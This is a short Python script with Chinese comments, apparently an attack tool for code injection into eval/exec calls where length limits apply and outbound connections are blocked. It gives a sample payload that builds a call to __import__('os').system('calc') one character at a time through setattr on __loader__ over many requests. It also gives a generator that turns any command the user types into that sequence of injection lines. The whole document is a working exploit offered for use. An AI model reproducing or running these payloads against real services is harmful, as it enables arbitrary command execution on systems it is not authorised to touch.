#by leeya_bug

#适用于不出网的长度限制场景
#注意: 该版本不是一行版本，需要多次请求
#适用于eval、exec等函数

#Payload: 
if False:
    setattr(__loader__,'a','_')
    setattr(__loader__,'a',__loader__.a+'_')
    setattr(__loader__,'a',__loader__.a+'i')
    setattr(__loader__,'a',__loader__.a+'m')
    setattr(__loader__,'a',__loader__.a+'p')
    setattr(__loader__,'a',__loader__.a+'o')
    setattr(__loader__,'a',__loader__.a+'r')
    setattr(__loader__,'a',__loader__.a+'t')
    setattr(__loader__,'a',__loader__.a+'_')
    setattr(__loader__,'a',__loader__.a+'_')
    setattr(__loader__,'a',__loader__.a+'(')
    setattr(__loader__,'a',__loader__.a+'\'')
    setattr(__loader__,'a',__loader__.a+'o')
    setattr(__loader__,'a',__loader__.a+'s')
    setattr(__loader__,'a',__loader__.a+'\'')
    setattr(__loader__,'a',__loader__.a+')')
    setattr(__loader__,'a',__loader__.a+'.')
    setattr(__loader__,'a',__loader__.a+'s')
    setattr(__loader__,'a',__loader__.a+'y')
    setattr(__loader__,'a',__loader__.a+'s')
    setattr(__loader__,'a',__loader__.a+'t')
    setattr(__loader__,'a',__loader__.a+'e')
    setattr(__loader__,'a',__loader__.a+'m')
    setattr(__loader__,'a',__loader__.a+'(')
    setattr(__loader__,'a',__loader__.a+'\'')
    setattr(__loader__,'a',__loader__.a+'c')
    setattr(__loader__,'a',__loader__.a+'a')
    setattr(__loader__,'a',__loader__.a+'l')
    setattr(__loader__,'a',__loader__.a+'c')
    setattr(__loader__,'a',__loader__.a+'\'')
    setattr(__loader__,'a',__loader__.a+')')
    eval(__loader__.a)

#Payload生成
print('该Payload为多次请求版，一行请求一次')
cmd = input('请输入命令: ')
a = f'''__import__('os').system('{cmd}')'''
a0 = list(a[::-1])

print(f'''setattr(__loader__,'a','{a0.pop()}')''')
while True:
    try:
        a1 = a0.pop()
        a2 = a1 if a1!="'" else "\\'"
        print(f'''setattr(__loader__,'a',__loader__.a+'{a2}')''')
    except:
        break
print("eval(__loader__.a)")
